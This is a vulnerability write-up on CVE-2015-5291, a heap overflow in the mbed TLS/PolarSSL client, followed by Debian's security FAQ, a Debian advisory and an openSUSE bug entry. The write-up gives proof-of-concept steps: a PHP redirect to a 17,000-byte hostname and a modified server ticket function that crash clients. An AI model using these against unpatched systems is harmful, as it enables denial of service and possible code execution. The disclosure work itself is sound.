CVE-2015-5291

Remote heap corruption in ARM mbed TLS / PolarSSL

By Guido Vranken <guidovranken@gmail.com>

Introduction

This document elaborates on the general mechanism employed by ARM mbed TLS / PolarSSL in its set
of functions that handle the TLS extensions1 supported by the library, and how this mechanism
possesses an inherent weakness. The weakness under consideration here revolves around the lack of
bound checking by extension functions; as they are writing their data into the output buffer bound for
the remote end, they fail to verify that the amount of data they are copying (usually via memcpy) does
not exceed the space left in the output buffer, whose total size is just 16 kilobytes in the library's default
configuration, which is (usually) sufficient for normal use but is prone to heap corruption if either
unorthodox use of the library or malice enter the picture.

One particular TLS extension supported and handled by the library, namely the TLS Session Tickets2
extension, enables a malicious server to exploit this weakness remotely in its victim (the client
connected to it), which has led to the allocation of CVE-2015-52913 and the issuance of a security
advisory by the mbed TLS team.

Rather than focusing on the remote vulnerability alone, this document elaborates on all functions that
are affected the weakness in the mechanism, as they can all contribute to the viability of remote
exploitation as long as an attacker is able to influence their parameters. Similarly, while the ticket
extension is de facto the only extension whose weakness can be triggered at the behest of the remote
end while using the library's stock configuration, some of the other functions are prone to the same
weakness if the parent application which embeds the library allows more extensive parameterization by
remote ends.

TLS Extensions
During the TLS handshake, data chunks belonging to various enabled TLS extensions are included in
the outbound ClientHello and ServerHello data structures.

RFC 52464 defines these structures as follows:

1
2
3

The Extension structure is defined as follows:

} Extension;

TLS extensions in the library's client code

Extension implementations

What follows is a list of functions invoked by the client which write extension data for each enabled
extension into the output buffer.

All these functions have the same format:

The first parameter is the current SSL context.

The second parameter is the start of the area that may be written by the extension function.

The third parameter is a pointer to the variable that will receive the total amount of bytes written by the
extension function.

Walkthrough of the extension functions and amount of data consumed

ssl_write_hostname_ext

If ssl->hostname is not set, then no data is written; if ssl->hostname is set (using
mbedtls_ssl_set_hostname in library/ssl_tls.c), then writing to the output buffer will commence, in the
following fashion:

  93     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_SERVERNAME >> 8 ) &
0xFF );
  94     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_SERVERNAME      ) &
0xFF );
  95
  96     *p++ = (unsigned char)( ( (hostname_len + 5) >> 8 ) & 0xFF );
  97     *p++ = (unsigned char)( ( (hostname_len + 5)      ) & 0xFF );
  98
  99     *p++ = (unsigned char)( ( (hostname_len + 3) >> 8 ) & 0xFF );
 100     *p++ = (unsigned char)( ( (hostname_len + 3)      ) & 0xFF );
 101
 102     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_SERVERNAME_HOSTNAME ) &
0xFF );
 103     *p++ = (unsigned char)( ( hostname_len >> 8 ) & 0xFF );
 104     *p++ = (unsigned char)( ( hostname_len      ) & 0xFF );
 105
 106     memcpy( p, ssl->hostname, hostname_len );

 107
 108     *olen = hostname_len + 9;

Here it can be observed that 9 bytes are consumed by various metadata about the extension and the
hostname string, and a variable amount of bytes are consumed by the hostname string itself.

For the sake of clarity I'll point out that hostname_len is the length of ssl->hostname (interpreted as a
null-terminated string). ssl->hostname and and ssl->hostname_len are defined in
mbedtls_ssl_hostname() in library/ssl_tls.c:

5593 int mbedtls_ssl_set_hostname( mbedtls_ssl_context *ssl, const char
*hostname )
5594 {
5595     size_t hostname_len;
5596
5597     if( hostname == NULL )
5598         return( MBEDTLS_ERR_SSL_BAD_INPUT_DATA );
5599
5600     hostname_len = strlen( hostname );
5601
5602     if( hostname_len + 1 == 0 )
5603         return( MBEDTLS_ERR_SSL_BAD_INPUT_DATA );
5604
5605     ssl->hostname = mbedtls_calloc( 1, hostname_len + 1 );
5606
5607     if( ssl->hostname == NULL )
5608         return( MBEDTLS_ERR_SSL_ALLOC_FAILED );
5609
5610     memcpy( ssl->hostname, hostname, hostname_len );
5611
5612     ssl->hostname[hostname_len] = '\0';
5613
5614     return( 0 );
5615 }

Added to output buffer: 9 to (9 + unlimited

 5  ) bytes.

ssl_write_renegotiation_ext

129     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_RENEGOTIATION_INFO >> 8 ) &
0xFF );
130     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_RENEGOTIATION_INFO      ) &
0xFF );
131
132     *p++ = 0x00;
133     *p++ = ( ssl->verify_data_len + 1 ) & 0xFF;
134     *p++ = ssl->verify_data_len & 0xFF;
135
136     memcpy( p, ssl->own_verify_data, ssl->verify_data_len );
137
138     *olen = 5 + ssl->verify_data_len;

“unlimited” here means that the library itself doesn't possess a bounding mechanism and in practice its size is only
limited by the system's allocation limits and the architectural strictures that underpin it.

ssl->verify_data and ssl->verify_data_len are defined at two places in the library:

In mbedtls_ssl_write_finished() in library/ssl_tls.c:

4945     // TODO TLS/1.2 Hash length is determined by cipher suite (Page 63)
4946     hash_len = ( ssl->minor_ver == MBEDTLS_SSL_MINOR_VERSION_0 ) ? 36 :
12;
4947
4948 #if defined(MBEDTLS_SSL_RENEGOTIATION)
4949     ssl->verify_data_len = hash_len;
4950     memcpy( ssl->own_verify_data, ssl->out_msg + 4, hash_len );
4951 #endif

and in mbedtls_ssl_parse_finished() in library/ssl_tls.c:

5068 #if defined(MBEDTLS_SSL_PROTO_SSL3)
5069     if( ssl->minor_ver == MBEDTLS_SSL_MINOR_VERSION_0 )
5070         hash_len = 36;
5071     else
5072 #endif
5073         hash_len = 12;
....
5089 #if defined(MBEDTLS_SSL_RENEGOTIATION)
5090     ssl->verify_data_len = hash_len;
5091     memcpy( ssl->peer_verify_data, buf, hash_len );
5092 #endif

Added to output buffer: either 12 or 36 bytes.

ssl_write_signature_algorithms_ext

The ssl->conf->sig_hashes list can be manually set using mbedtls_ssl_conf_sig_hashes() in
library/ssl_tls.c. If the default configuration is enabled using mbedtls_ssl_config_defaults() in
library/ssl_tls.c, then ssl->conf->sig_hashes will either be:

7096             conf->sig_hashes = ssl_preset_suiteb_hashes;

or

7129             conf->sig_hashes = mbedtls_md_list();

ssl_parse_new_session_ticket() is invoked in the
MBEDTLS_SSL_SERVER_NEW_SESSION_TICKET stage of the handshake in
mbedtls_ssl_handshake_client_step() in library/ssl_cli.c:

3060            ret = ssl_parse_new_session_ticket( ssl );
3061            break;

Crucial in understanding CVE-2015-5291 is the interplay between these two functions.

The remote end (which in this case is the server, since the vulnerability only affects the client part of
the library) is free to send an arbitrarily sized block of data to the client. Its maximum size is 64 kb as
implied by the two bytes used to encode the size (line 2899 in ssl_parse_new_session_ticket()). Even if
64 kb exceeds the client's allocation limit, the library will gracefully halt the handshake and return with
an error code to its caller (line 2926). If it succeeds, the relevant internal state variables ssl-
>session_negotiate->ticket and ssl->session_negotiate->ticket_len are set to the right values.

However, upon echoing the ticket back the the server in ssl_write_session_ticket_ext(), the entire ticket
chunk is memcpy()'ied into the client's output buffer (line 415 in ssl_write_session_ticket_ext()).

Added to output buffer: 4  to (4 + 0xFFFF = 65539) bytes.

452         *p = (unsigned char)( strlen( *cur ) & 0xFF );
453         memcpy( p + 1, *cur, *p );
454         p += 1 + *p;
455     }
456
457     *olen = p - buf;
458
459     /* List length = olen - 2 (ext_type) - 2 (ext_len) - 2 (list_len) */
460     buf[4] = (unsigned char)( ( ( *olen - 6 ) >> 8 ) & 0xFF );
461     buf[5] = (unsigned char)( ( ( *olen - 6 )      ) & 0xFF );
462
463     /* Extension length = olen - 2 (ext_type) - 2 (ext_len) */
464     buf[2] = (unsigned char)( ( ( *olen - 4 ) >> 8 ) & 0xFF );
465     buf[3] = (unsigned char)( ( ( *olen - 4 )      ) & 0xFF );

Ssl->conf->alpn_list can be defined by the parent application that utilizes the library, using the
mbedtls_ssl_conf_alpn_protocols() function in library/ssl_tls.c:

5630 int mbedtls_ssl_conf_alpn_protocols( mbedtls_ssl_config *conf, const
char **protos )
5631 {
5632     size_t cur_len, tot_len;
5633     const char **p;
5634
5635     /*
5636      * "Empty strings MUST NOT be included and byte strings MUST NOT be
5637      * truncated". Check lengths now rather than later.
5638      */
5639     tot_len = 0;
5640     for( p = protos; *p != NULL; p++ )
5641     {
5642         cur_len = strlen( *p );
5643         tot_len += cur_len;
5644
5645         if( cur_len == 0 || cur_len > 255 || tot_len > 65535 )
5646             return( MBEDTLS_ERR_SSL_BAD_INPUT_DATA );
5647     }
5648
5649     conf->alpn_list = protos;
5650
5651     return( 0 );
5652 }

This function ensures that each individual ALPN string does not exceed 255 bytes, and the combined
size does not exceed 64 kb, in accordance with the specifications expressed in RFC 73016.

Added to output buffer: 6 to (6 + 65535 = 65541) bytes.

How to cause heap corruption in the client

There are three functions whose upper bound exceeds the library's default output buffer of 16 kilobytes:

•

•

•

ssl_write_alpn_ext

ssl_write_hostname_ext

ssl_write_session_ticket_ext

ssl_write_alpn_ext

Only if the server can control the client's supported Application Layer Protocols, which can only be set
via mbedtls_ssl_conf_alpn_protocols, remote heap corruption is possible. This is unlikely.

ssl_write_hostname_ext

The first one, ssl_write_hostname_ext will usually write an amount of bytes under or around 256 bytes,
since this is limit imposed by the Domain Name System (DNS) and any host name exceeding that
amount will be unable to resolve to an IP address. Since an IP address is required to initiate a
handshake, and thus the corruption of the heap cannot occur if we assume that a valid DNS lookup of,
say, a host name 17 kilobytes in size, is impossible, it is tempting to disregard (remote or local) the
possibility of exploitation via ssl_write_hostname_ext in a decently programmed software.

However, exceptions to this rule exist. A system's mechanism for translating host names to IP addresses
is sometimes not singularly based on valid DNS queries; Linux, for instance, allows custom host names
to be defined in /etc/hosts.

I have been able to remotely cause a segmentation fault in curl+PolarSSL by following these steps:

Create a PHP file on your web server:

<?php
    $hostname = str_repeat("y", 17000);
    header("Location: https://" . $hostname . ":80");
?>

Obviously, this will redirect curl (the command-line binary) to the ~ 17 kilobyte host name
“yyyyyyyy...” if it is invoked with –location that will enable following redirects. In my /etc/hosts file, I
placed exactly this 17000 bytes wide string preceded with “127.0.0.1”, so that a lookup of that
hostname would resolve to 127.0.0.1. On localhost I ran a TLS server. This process caused curl to
crash.

It follows that if an attacker can control or influence the hostname-IP pairs available to a client's
lookup, exploitation might be possible.

ssl_write_session_ticket_ext

SSL session tickets are enabled by default in the library. The condition under which exploitation is
possible is that the client will reuse it's context (ie., the set of internal state variables pertaining to a
certain outbound connection) once.

In library/ssl_ticket.c, change mbed_tls_ticket_write() to something like this:

285 int mbedtls_ssl_ticket_write( void *p_ticket,
286                               const mbedtls_ssl_session *session,
287                               unsigned char *start,
288                               const unsigned char *end,
289                               size_t *tlen,
290                               uint32_t *ticket_lifetime )
291 {
292     int ret;
293     mbedtls_ssl_ticket_context *ctx = p_ticket;
294     unsigned char *key_name = start;
295     unsigned char *iv = start + 4;
296     unsigned char *state_len_bytes = iv + 12;
297     unsigned char *state = state_len_bytes + 2;
298     size_t clear_len;

299
300     clear_len = 16300;
301     if( ctx == NULL || ctx->f_rng == NULL )
302         return( MBEDTLS_ERR_SSL_BAD_INPUT_DATA );
303
304     memset(state, 0, clear_len);
305     state_len_bytes[0] = ( clear_len >> 8 ) & 0xff;
306     state_len_bytes[1] = ( clear_len      ) & 0xff;
307
308     *tlen = 4 + 12 + 2 + 16 + clear_len;
309
310 #if defined(MBEDTLS_THREADING_C)
311     if( mbedtls_mutex_unlock( &ctx->mutex ) != 0 )
312         return( MBEDTLS_ERR_THREADING_MUTEX_ERROR );
313 #endif
314
315     return 0;
316 }

And be sure to increase it's own buffer size (or else it will corrupt its own heap):

in include/mbedtls/ssl.h:

 232 #if !defined(MBEDTLS_SSL_MAX_CONTENT_LEN)
 233 #define MBEDTLS_SSL_MAX_CONTENT_LEN         (1024*1024)   /**< Size of

This is what is happening here:

1. Client connects to the server.
2. Server gives client a session ticket, client stores this session ticket.
3. Regular transmission takes place between the client and the server and the connection is closed.
4. The client reconnects to the server, sends its stored session ticket, and because its size exceeds

the current space left in the client's output buffer, it corrupts its own heap.

How the extension functions are interlinked

It must be borne in mind that, while remote heap corruption can be achieved by one singular extension,
the extent of the heap corruption itself depends also on the amount of data written by preceding
extension functions invoked.

Let's again consider the order in which the extension functions are invoked in ssl_write_client_hello()
in library/ssl_cli.c:

759     ssl_write_hostname_ext( ssl, p + 2 + ext_len, &olen );
764     ssl_write_renegotiation_ext( ssl, p + 2 + ext_len, &olen );
770     ssl_write_signature_algorithms_ext( ssl, p + 2 + ext_len, &olen );
775     ssl_write_supported_elliptic_curves_ext( ssl, p + 2 + ext_len,
&olen );
778     ssl_write_supported_point_formats_ext( ssl, p + 2 + ext_len, &olen );
783     ssl_write_max_fragment_length_ext( ssl, p + 2 + ext_len, &olen );
788     ssl_write_truncated_hmac_ext( ssl, p + 2 + ext_len, &olen );
793     ssl_write_encrypt_then_mac_ext( ssl, p + 2 + ext_len, &olen );
798     ssl_write_extended_ms_ext( ssl, p + 2 + ext_len, &olen );
803     ssl_write_session_ticket_ext( ssl, p + 2 + ext_len, &olen );
808     ssl_write_alpn_ext( ssl, p + 2 + ext_len, &olen );

It makes a difference if the host name is only 10 or 100 bytes wide; the host name data is written before
ssl_write_session_ticket_ext() is invoked, and the difference in the length of the host name implies how
much data can be written outside of buffer bounds.

In other words, the effect is accumulative. To the attacker, this property can be helpful, since this offers
them a degree of granularity that may aid in successfully exploiting the vulnerability for whatever
malicious idea they have in mind.

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

[CVE-2015-8036 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8036)

#### Description

Heap-based buffer overflow in ARM mbed TLS (formerly PolarSSL) 1.3.x before 1.3.14 and 2.x before 2.1.2 allows remote SSL servers to cause a denial of service (client crash) and possibly execute arbitrary code via a long session ticket name to the session ticket extension, which is not properly handled when creating a ClientHello message to resume a session. NOTE: this identifier was SPLIT from CVE-2015-5291 per ADT3 due to different affected version ranges.

Package        : polarssl
CVE ID         : CVE-2015-5291 CVE-2015-8036
Debian Bug     : 801413

It was discovered that polarssl, a library providing SSL and TLS
support, contained two heap-based buffer overflows that could allow a
remote attacker to trigger denial of service (via application crash)
or arbitrary code execution.

For the oldstable distribution (wheezy), these problems have been fixed
in version 1.2.9-1~deb7u6.

For the stable distribution (jessie), these problems have been fixed in
version 1.3.9-2.1+deb8u1.

We recommend that you upgrade your polarssl packages.

| [Description](show_bug.cgi?id=989694#c0)  Martin Pluskal   2016-07-20 07:59:13 UTC  ``` polarssl-1.3.9 from openSUSE-13.2 seems to be vulnerable to following issue:  Heap-based buffer overflow in ARM mbed TLS (formerly PolarSSL) 1.3.x before 1.3.14 and 2.x before 2.1.2 allows remote SSL servers to cause a denial of service (client crash) and possibly execute arbitrary code via a long session ticket name to the session ticket extension, which is not properly handled when creating a ClientHello message to resume a session. NOTE: this identifier was SPLIT from CVE-2015-5291 per ADT3 due to different affected version ranges. ``` [Comment 1](show_bug.cgi?id=989694#c1)  Andreas Stieger   2016-07-31 23:21:44 UTC  ``` release update ``` [Comment 2](show_bug.cgi?id=989694#c2)  Swamp Workflow Management   2016-08-01 03:12:22 UTC  ``` openSUSE-SU-2016:1928-1: An update that fixes one vulnerability is now available.
